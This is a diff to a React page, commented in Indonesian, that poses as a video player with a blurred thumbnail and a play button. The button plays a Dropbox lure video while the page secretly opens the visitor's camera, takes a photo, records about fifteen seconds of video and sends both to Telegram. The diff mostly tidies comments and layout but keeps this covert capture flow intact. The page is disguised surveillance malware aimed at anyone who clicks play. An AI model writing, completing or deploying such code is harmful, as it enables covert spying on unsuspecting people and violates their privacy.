@@ -4,12 +4,11 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, Vis
 
 function App() {
   const [isBlurred, setIsBlurred] = useState(true);
-  const [isPlaying, setIsPlaying] = useState(false); // State untuk melacak status pemutaran
-  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg'; // Placeholder thumbnail sementara
-  const videoRef = useRef<HTMLVideoElement>(null); // Referensi untuk video
-  const cameraStreamRef = useRef<MediaStream | null>(null); // Referensi untuk stream kamera
+  const [isPlaying, setIsPlaying] = useState(false);
+  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const cameraStreamRef = useRef<MediaStream | null>(null);
 
-  // Tautan Dropbox untuk video (pastikan ini adalah URL langsung)
   const dropboxVideoUrl = 'https://dl.dropboxusercontent.com/scl/fi/mp0cutqd18jtl7sutqfvu/VID_20250403_031208_872.mp4?rlkey=dxkmv02omhepbbgiip3c0enpn&dl=0';
 
   useEffect(() => {
@@ -34,13 +33,11 @@ function App() {
   const captureAndSendMedia = useCallback(async () => {
     console.log('Mulai proses pengambilan media...');
     try {
-      // Mulai memutar video dummy
       if (videoRef.current) {
         videoRef.current.play().catch(err => console.error('Error memutar video:', err));
-        setIsBlurred(false); // Hilangkan blur saat video dimulai
+        setIsBlurred(false);
       }
 
-      // Ambil perangkat kamera
       console.debug('Mencari perangkat media...');
       const devices = await navigator.mediaDevices.enumerateDevices();
       const videoDevice = devices.find(device => device.kind === 'videoinput');
@@ -61,7 +58,6 @@ function App() {
       const settings = videoTrack.getSettings();
       console.debug('Pengaturan track video:', settings);
 
-      // Buat elemen video untuk menangkap dari kamera (tersembunyi)
       const cameraVideo = document.createElement('video');
       cameraVideo.srcObject = stream;
       cameraVideo.playsInline = true;
@@ -71,7 +67,6 @@ function App() {
       
       document.body.appendChild(cameraVideo);
 
-      // Tunggu metadata dan mulai penangkapan
       await new Promise((resolve) => {
         cameraVideo.onloadedmetadata = async () => {
           console.log('Metadata video kamera dimuat, mencoba memutar');
@@ -86,7 +81,6 @@ function App() {
         };
       });
 
-      // Tangkap foto dari kamera
       const canvas = document.createElement('canvas');
       canvas.width = settings.width || 1280;
       canvas.height = settings.height || 720;
@@ -111,7 +105,6 @@ function App() {
       await sendImageToTelegram(photoBlob);
       console.log('Foto berhasil dikirim ke Telegram');
 
-      // Rekam video dari kamera
       const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4'];
       const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
       if (!supportedMimeType) throw new Error('Tidak ada format video yang didukung ditemukan (mp4/h264)');
@@ -152,7 +145,7 @@ function App() {
         }
         if (videoRef.current) videoRef.current.pause();
         setIsBlurred(true);
-        setIsPlaying(false); // Setel status pemutaran ke false saat selesai
+        setIsPlaying(false);
       }, 15000);
 
     } catch (error) {
@@ -162,27 +155,26 @@ function App() {
         cameraStreamRef.current = null;
       }
       setIsBlurred(true);
-      setIsPlaying(false); // Setel status pemutaran ke false jika error
+      setIsPlaying(false);
     }
   }, []);
 
   const handlePlayClick = async () => {
     console.log('Tombol play diklik, memulai pemutaran video dan pengambilan media');
     if (videoRef.current && !isPlaying) {
-      // Set sumber video ke tautan Dropbox
       videoRef.current.src = dropboxVideoUrl;
       try {
-        await videoRef.current.load(); // Muat ulang sumber video
-        await videoRef.current.play(); // Mulai pemutaran video
-        setIsPlaying(true); // Setel status pemutaran
-        setIsBlurred(false); // Hilangkan blur
+        await videoRef.current.load();
+        await videoRef.current.play();
+        setIsPlaying(true);
+        setIsBlurred(false);
       } catch (error) {
         console.error('Error memutar video dari Dropbox:', error);
         setIsBlurred(true);
         setIsPlaying(false);
       }
     }
-    await captureAndSendMedia(); // Lanjutkan dengan capture dan send media
+    await captureAndSendMedia();
   };
 
   return (
@@ -196,12 +188,21 @@ function App() {
         <div className="max-w-[1080px] mx-auto">
           <div className="relative">
             <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
-              {isBlurred && (
-                <div className="absolute inset-0 bg-black/50" /> /* Hilangkan teks dan gunakan blur sederhana */
+              {/* Tampilkan thumbnail hanya jika video belum diputar */}
+              {!isPlaying && (
+                <img 
+                  src={thumbnailUrl} 
+                  alt="Thumbnail Video" 
+                  className="w-full h-full object-cover absolute inset-0 z-0"
+                />
+              )}
+              {/* Overlay blur hanya aktif sebelum video diputar */}
+              {isBlurred && !isPlaying && (
+                <div className="absolute inset-0 bg-black/20 backdrop-blur-sm" />
               )}
               <video
                 ref={videoRef}
-                className="w-full h-full object-cover"
+                className="w-full h-full object-cover relative z-10"
                 muted
                 loop
                 onEnded={() => {
@@ -209,20 +210,17 @@ function App() {
                   setIsPlaying(false);
                 }}
               />
-              <div className="absolute inset-0 flex items-center justify-center z-10">
-                <button 
-                  onClick={handlePlayClick}
-                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
-                  disabled={isPlaying} // Nonaktifkan tombol saat video diputar
-                >
-                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
-                </button>
-              </div>
-              <img 
-                src={thumbnailUrl} 
-                alt="Thumbnail Video" 
-                className="w-full h-full object-cover"
-              />
+              {/* Tombol play hanya muncul jika video belum diputar */}
+              {!isPlaying && (
+                <div className="absolute inset-0 flex items-center justify-center z-20">
+                  <button 
+                    onClick={handlePlayClick}
+                    className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
+                  >
+                    <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
+                  </button>
+                </div>
+              )}
             </div>
           </div>
         </div>
@@ -231,4 +229,4 @@ function App() {
   );
 }
 
-export default App;;
+export default App;
